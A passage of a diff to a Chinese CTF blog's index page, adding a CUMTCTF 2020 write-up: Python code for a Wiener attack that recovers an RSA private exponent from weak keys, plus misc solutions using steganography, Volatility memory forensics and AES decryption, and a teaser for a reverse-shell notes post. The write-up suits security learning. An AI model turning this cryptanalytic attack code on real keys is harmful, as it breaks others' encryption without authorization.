key</span><br><span class="line">        if k!&#x3D;0 and (e*d-1)%k &#x3D;&#x3D; 0:</span><br><span class="line">            phi &#x3D; (e*d-1)&#x2F;&#x2F;k</span><br><span class="line">            s &#x3D; n - phi + 1</span><br><span class="line">            # check if the equation x^2 - s*x + n &#x3D; 0</span><br><span class="line">            # has integer roots</span><br><span class="line">            discr &#x3D; s*s - 4*n</span><br><span class="line">            if(discr&gt;&#x3D;0):</span><br><span class="line">                t &#x3D; Arithmetic.is_perfect_square(discr)</span><br><span class="line">                if t!&#x3D;-1 and (s+t)%2&#x3D;&#x3D;0:</span><br><span class="line">                    print(&quot;Hacked!&quot;)</span><br><span class="line">                    return d</span><br><span class="line"></span><br><span class="line"># TEST functions</span><br><span class="line"></span><br><span class="line">def test_hack_RSA():</span><br><span class="line">    print(&quot;Testing Wiener Attack&quot;)</span><br><span class="line">    times &#x3D; 5</span><br><span class="line">    </span><br><span class="line">    while(times&gt;0):</span><br><span class="line">        e,n,d &#x3D; RSAvulnerableKeyGenerator.generateKeys(1024)</span><br><span class="line">        print(&quot;(e,n) is (&quot;, e, &quot;, &quot;, n, &quot;)&quot;)</span><br><span class="line">        print(&quot;d &#x3D; &quot;, d)</span><br><span class="line">    </span><br><span class="line">        hacked_d &#x3D; hack_RSA(e, n)</span><br><span class="line">    </span><br><span class="line">        if d &#x3D;&#x3D; hacked_d:</span><br><span class="line">            print(&quot;Hack WORKED!&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;Hack FAILED&quot;)</span><br><span class="line">        </span><br><span class="line">        print(&quot;d &#x3D; &quot;, d, &quot;, hacked_d &#x3D; &quot;, hacked_d)</span><br><span class="line">        print(&quot;-------------------------&quot;)</span><br><span class="line">        times -&#x3D; 1</span><br><span class="line">    </span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    n &#x3D; 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597</span><br><span class="line">    e &#x3D; 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span><br><span class="line">    c &#x3D; 235079473042454099807116076488262740135383858230967099540307826273199444131724945298259060669497025680602868465015609167157760611830665379910856647739895018654389167886359502125262006498872925841789249028759026079722290718145036644959479543255350040619949567107916725017078853648984759794085772688267388901151</span><br><span class="line">    #test_is_perfect_square()</span><br><span class="line">    d &#x3D; 8264667972294275017293339772371783322168822149471976834221082393409363691895</span><br><span class="line">    m &#x3D; pow(c,d,n)</span><br><span class="line">    def num2str(num):</span><br><span class="line">        tmp &#x3D; hex(num)[2:].replace(&quot;L&quot;,&quot;&quot;)</span><br><span class="line">        if(len(tmp))%2 &#x3D;&#x3D;0:</span><br><span class="line">            return tmp.decode(&quot;hex&quot;)</span><br><span class="line">        else:</span><br><span class="line">            return (&quot;0&quot;+tmp).decode(&quot;hex&quot;)</span><br><span class="line">    print(num2str(m))</span><br><span class="line">    #print(&quot;-------------------------&quot;)</span><br><span class="line">    #print(hack_RSA(e,n))</span><br><span class="line"></span><br><span class="line">CUMTCTF&#123;1bc205a110e6643137e045b8268b4ace&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="Sign-In"><a href="#Sign-In" class="headerlink" title="Sign In"></a>Sign In</h2><p>转base64在转brainfk</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CUMTCTF&#123;Welcome_to_CUMTCTF_2020_Final&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="出个流量分析吧"><a href="#出个流量分析吧" class="headerlink" title="出个流量分析吧"></a>出个流量分析吧</h2><p>http流base64解码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;WirRSharK_S0_E45y&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="出个LSB吧"><a href="#出个LSB吧" class="headerlink" title="出个LSB吧"></a>出个LSB吧</h2><p>LSB隐写</p>
+<p>red green blue 0 0 0</p>
+<p>保存得二维码 扫得flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cumtctf&#123;1sb_i4_s0_Ea4y&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="出个伪web吧"><a href="#出个伪web吧" class="headerlink" title="出个伪web吧"></a>出个伪web吧</h2><p>查看最新修改文件的时间</p>
+<p>可以看到pass中有明显字符串cumt</p>
+<p>然后拿flag包裹就行</p>
+<h2 id="出个文档吧"><a href="#出个文档吧" class="headerlink" title="出个文档吧"></a>出个文档吧</h2><p>隐藏文字</p>
+<h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f memory.img imageinfo</span><br><span class="line">python vol.py -f memory.img --profile=Win2003SP0x86 filescan |grep flag</span><br></pre></td></tr></table></figure>
+<p>可以看到有flag.png，输出一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 dumpfiles -D .&#x2F; -Q 0x000000000484f900</span><br></pre></td></tr></table></figure>
+<p>可以看到一个图片扫一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D;</span><br></pre></td></tr></table></figure>
+<p>解不出来</p>
+<p>查看系统窗口列表，看有没有和flag有关的程序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 windows | grep flag</span><br></pre></td></tr></table></figure>
+<p>可以看到有一个程序dump一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 memdump -D .&#x2F; -p 1992</span><br></pre></td></tr></table></figure>
+<p>用foremost分离一下</p>
+<p>可以看到有图片</p>
+<p>有key值和vi 然后就是AES加密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">key:Th1s_1s_K3y00000</span><br><span class="line">vi:1234567890123456</span><br><span class="line">base64:jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D;</span><br><span class="line"></span><br><span class="line">flag&#123;F0uNd_s0m3th1ng_1n_M3mory&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="出个压缩包吧"><a href="#出个压缩包吧" class="headerlink" title="出个压缩包吧"></a>出个压缩包吧</h2><p>010打开之后发现有secret.png没有伪加密，很明显子块被修改</p>
+<p>7a改成74</p>
+<p>分离出secret.png</p>
+<p>发现是一张图片，但有两帧</p>
+<p>脱到steg里面可以看到两个残缺的二维码</p>
+<p>补全，就可以看到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;yanji4n_bu_we1shi&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/timg.jpeg">
+      <meta itemprop="name" content="Pz1o">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pz1o's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">反弹shell总结</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-10-03 13:45:01" itemprop="dateCreated datePublished" datetime="2020-10-03T13:45:01+08:00">2020-10-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-06 14:32:57" itemprop="dateModified" datetime="2020-10-06T14:32:57+08:00">2020-10-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.9k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近遇到反弹shell，总结一下反弹shell，用来做笔记</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -549,7 +861,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-09-27 23:13:53" itemprop="dateModified" datetime="2020-09-27T23:13:53+08:00">2020-09-27</time>
+                <time title="修改时间：2020-10-20 19:55:31" itemprop="dateModified" datetime="2020-10-20T19:55:31+08:00">2020-10-20</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -567,14 +879,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>3.8k</span>
+              <span>7k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
+              <span>6 分钟</span>
             </span>
 
         </div>
@@ -644,7 +956,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-08-13 16:27:02" itemprop="dateModified" datetime="2020-08-13T16:27:02+08:00">2020-08-13</time>
+                <time title="修改时间：2020-10-06 15:15:27" itemprop="dateModified" datetime="2020-10-06T15:15:27+08:00">2020-10-06</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -662,7 +974,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>2k</span>
+              <span>2.4k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -896,81 +1208,11 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/27/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/timg.jpeg">
-      <meta itemprop="name" content="Pz1o">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pz1o's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/06/27/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" class="post-title-link" itemprop="url">我的第一篇博客</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-06-27 22:56:15 / 修改时间：23:34:27" itemprop="dateCreated datePublished" datetime="2020-06-27T22:56:15+08:00">2020-06-27</time>
-            </span>
-
-          
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>16</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>2020/6/27 我的第一篇博客</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
 
 
 
@@ -1037,20 +1279,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-count">11</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-count">13</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -1086,12 +1328,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">70k</span>
+    <span title="站点总字数">96k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">1:04</span>
+    <span title="站点阅读时长">1:27</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
